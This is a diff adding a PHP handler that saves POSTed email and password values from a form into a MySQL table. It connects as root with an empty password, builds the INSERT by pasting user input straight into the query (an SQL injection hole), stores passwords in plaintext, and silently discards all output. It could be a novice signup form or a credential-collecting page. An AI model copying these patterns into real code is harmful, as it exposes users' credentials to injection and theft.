@@ -1,3 +1,27 @@
+<?php
+ if(isset($_POST['email'])){
+  $server = "localhost";
+  $username = "root";
+  $password = "";
+  
+  $conn = mysqli_connect($server,$username,$password);
+if(!$conn){
+  die("" . mysqli_connect_error());
+}
+$email = $_POST['email'];
+$password = $_POST['pass'];
+ $sql = "INSERT INTO `forms`.`mails` ( `Email`, `Password`) VALUES ('$email', '$password');";
+ 
+ 
+if($conn->query($sql) == true){
+  echo "";
+}
+else{
+  echo "";
+}
+$conn->close();
+}
+?>
 
 <!doctype html>
 <html lang="en">
